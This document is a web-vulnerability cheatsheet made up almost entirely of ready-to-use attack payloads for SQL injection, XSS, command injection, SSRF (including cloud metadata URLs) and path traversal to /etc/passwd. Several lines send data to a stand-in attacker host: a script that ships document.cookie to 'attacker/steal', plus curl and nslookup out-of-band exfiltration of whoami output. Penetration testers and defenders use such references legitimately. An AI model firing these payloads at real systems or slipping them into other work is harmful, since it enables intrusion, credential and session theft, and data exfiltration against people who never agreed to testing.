# Web Vulnerabilities Cheatsheet

## SQL Injection

```sql
-- Detection
'
"
' OR '1'='1
" OR "1"="1

-- Union-based
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT 1,username,password FROM users--

-- Error-based
' AND 1=CONVERT(int,@@version)--
' AND extractvalue(1,concat(0x7e,version()))--

-- Blind (Boolean)
' AND 1=1--    (true)
' AND 1=2--    (false)
' AND SUBSTRING(username,1,1)='a'--

-- Blind (Time)
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
```

## XSS (Cross-Site Scripting)

```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Event handlers -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>

<!-- Bypass filters -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>

<!-- Cookie stealing -->
<script>new Image().src="http://attacker/steal?c="+document.cookie</script>
```

## Command Injection

```bash
# Concatenation
; id
| id
|| id
&& id
`id`
$(id)

# Blind (time-based)
; sleep 5
| sleep 5
`sleep 5`

# Out-of-band
; curl http://attacker/$(whoami)
; nslookup $(whoami).attacker.com
```

## SSRF (Server-Side Request Forgery)

```
# Localhost bypass
http://127.0.0.1
http://localhost
http://[::1]
http://127.1
http://0.0.0.0

# Cloud metadata
http://169.254.169.254/latest/meta-data/    # AWS
http://metadata.google.internal/             # GCP
http://169.254.169.254/metadata/v1/         # DigitalOcean
```

## Path Traversal / LFI

```
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
/etc/passwd%00.jpg

# Windows
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows\win.ini
```
